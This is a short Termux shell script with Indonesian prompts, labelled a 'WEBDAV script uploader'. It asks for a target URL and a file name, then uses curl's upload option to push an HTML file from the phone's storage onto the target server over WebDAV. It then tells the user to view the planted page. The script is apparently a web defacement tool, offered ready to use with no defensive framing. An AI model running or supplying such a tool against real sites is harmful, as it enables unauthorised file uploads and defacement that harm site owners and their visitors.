#UJi_Coba_Gaess
clear
pkg install curl
y
pkg install figlet
y
figlet  WEBDAV SCRIPT UPLOADER
echo "Masukan Target: "
read -p ">>>> " Target
echo "Masukan Nama Script: "
echo "Ex. namascript.html"
read -p ">>>> " Script
curl -T /storage/emulated/0/$Script $Target
echo ""
echo ""
echo "<==== SEDANG PROSES ====>"
sleep 1
sleep 2
echo "MONGGO DI CEK WEBNYA $Target/$Script"
echo ""
echo ""
figlet  THANKS YOU
exit
